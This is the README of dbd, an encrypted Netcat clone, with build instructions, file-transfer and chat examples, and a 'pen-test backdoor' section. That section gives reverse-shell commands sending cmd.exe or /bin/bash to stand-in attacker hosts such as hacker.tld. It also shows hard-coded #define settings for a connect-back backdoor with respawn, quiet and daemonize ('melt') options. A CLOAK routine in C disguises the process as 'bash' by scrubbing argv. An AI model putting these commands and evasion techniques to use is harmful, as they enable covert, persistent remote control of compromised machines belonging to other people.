###SYNOPSIS

dbd is a Netcat-clone, designed to be portable and offer strong encryption. It runs on Unix-like operating systems and on Microsoft Win32. dbd features AES-CBC-128 + HMAC-SHA1 encryption (by Christophe Devine), program execution (-e option), choosing source port, continuous reconnection with delay, and some other nice features. dbd supports TCP/IP communication only. Source code and binaries are distributed under the GNU General Public License.

###COMPILATION

	$ make
	usage:
	  make unix     - Linux, NetBSD, FreeBSD, OpenBSD
	  make unix32  - Linux, NetBSD, FreeBSD, OpenBSD 32-bit
	  make sunos    - SunOS (Solaris)
	  make win32    - native win32 console app (w/ Cygwin + MinGW)
	  make win32bg  - create a native win32 no-console app (w/ Cygwin + MinGW)
	  make win32bg CFLAGS=-DSTEALTH - stealthy no-console app
	  make mingw    - native win32 console app (w/ MinGW MSYS)
	  make mingwbg  - native win32 no-console app (w/ MinGW MSYS)
	  make mingwbg CFLAGS=-DSTEALTH - stealthy no-console app (w/ MinGW MSYS)
	  make cygwin   - Cygwin console app
	  make darwin   - Darwin

	roll up a tarball (move your compiled stuff to binaries/ first:
	  make dist     - create tarball with source files, readme, and binaries/

To compile dbd under a Unix-like operating system you need gcc and relevant development tools. For Linux, FreeBSD, NetBSD, OpenBSD (and possibly others), type:

	$ make unix

For SunOS/Solaris, type:

	$ make sunos

To compile dbd under Microsoft Windows (NT/2K/XP/2K3) you need MinGW+MSYS, or Cygwin with full development support (Cygwin's MinGW gcc). To compile a native Win32 dbd console application under Cygwin, type:

	$ make win32

or, under MSYS:

	$ make mingw

To compile a no-console ("WinMain") application under Cygwin, type:

	$ make win32bg

or, under MSYS:

	$ make mingwbg

To compile a Cygwin-specific console application, type:

	$make cygwin

You may want to change the default behaviour of dbd. One of the most important thing is to change the default shared secret to your own pass phrase. Edit dbd.h and replace with your preferences. You may, for example, want to hardcode a host + port to connect to if dbd is started without options. Complete examples are provided in dbd.h.

###SAMPLE USES

With a little imagination, dbd can be used for many things...
* Use dbd to securely transfer files between two networks:

	snafu$ dbd -l -p 12345 -k secret > output.file

	fubar$ cat input.file | dbd -k secret snafu 12345

or from win32:

	C:\somedir>type input.fil | dbd -k secret snafu 12345

* Use dbd as a simple (but secure) chat:

	snafu$ dbd -P snafu -Hon fubar 1234

	fubar$ dbd -Pfubar -Hon -l -p 1234

* Use dbd as a pen-test backdoor:

	C:\hacked box>dbdbg.exe -r1800 -q -e cmd.exe hacker.tld 443
	...

or under Unix-like OSes:

	root@owned# ./dbd -r1800 -Don -e /bin/bash hacker.tld 993

###HARD CODING OPTIONS

In addition to using command line options, you can hard code variables by using #defines in dbd.h. To do this, set the variables you wish to use as named constants and compile as normal. For example, if you wanted to hard code a dbd executable that connected back to "evil.nationalbankofuganda.com" on port 995, and executed "/bin/bash" you could run:

	root@owned# ./dbd -e /bin/bash evil.nationalbankofuganda.com 995

or using hard-coded #defines, you could edit dbd.h:

	#define DOLISTEN 0
	#define HOST "evil.nationalbankofuganda.com"
	#define PORT 995
	#define EXECPROG "/bin/bash"

	You can also set respawn and stealth options to help maintain your connection:

	#define RESPAWN_ENABLED 1
	#define RESPAWN_INTERVAL 900
	#define QUIET 1
	#define DAEMONIZE 1

This will set the connection to daemonize ("melt" in malware terms), never send output to STDOUT, and attempt to respawn the connection every 15 minutes should it ever disconnect from the listener.
	ROMULAN CLOAKING TECHNOLOGY

Now we're getting into the fun stuff. Once you are a mastar at hard-coding options into your backdoor, you can use what is quite possibly the most fun named constant at our disposal: CLOAK. To do this, simply set the value:

	#define CLOAK 1

NOTE: this currently only works on *nix compiles. Eventually I plan on adding Win32 process migration/hooking so those targets can feel some Romulan love as well.

For *nix environments, this option scrubs argv[0] and replaces it with the string "bash\0". It also scrubs all other argv[]'s (it'd look silly if ps returned "bash -e /bin/bash someremotehost.com 443" now wouldn't it?) I hope it goes without saying that you CANNOT USE THIS OPTION UNLESS YOU ARE HARD CODING YOUR VARIABLES INTO DBD.H. Also, if you're testing this on your own system it's gonna be fun picking the right pid to kill. ;)

Feel free to use this scrubber in anything you happen to be working on:

	//grab our named constant
	int cloak = CLOAK;

	//Engage cloaking device
	if(cloak)
	{
		#ifdef WIN32
		//stub              
		#else
		//change argv[0] to say bash       
		int scrub;
		strncpy((char *)argv[0], "\0", strlen((char *)argv[0]) + 1);
		strcpy((char *)argv[0], "bash\0");    
		for (scrub = 1; scrub < argc; scrub++)
		{                     
			 strncpy((char *)argv[scrub], "\0", strlen((char *)argv[scrub]) + 1);
		}                 
		#endif
	}

###WARNING

Do not pass cached input (a file with commands or similar) to a listening "dbd -e" session. "dbd -e" is using pipes to pass data between the program being executed and dbd. Pipes are used (instead of plain pass-through duplicate file descriptors) because of encryption between the pipes and the socket. In order to prevent the writing end of one of the pipes from blocking the whole process, I turned it into a non-blocking descriptor. There is a chance that when passing too much input at a time through to the -e program, it will be truncated (cut off) since the pipe buffer (in the OS) can't hold all of the data. This problem can be solved by making dbd multi-threaded for instance, but I'll avoid this as long as possible for compatibility reasons.
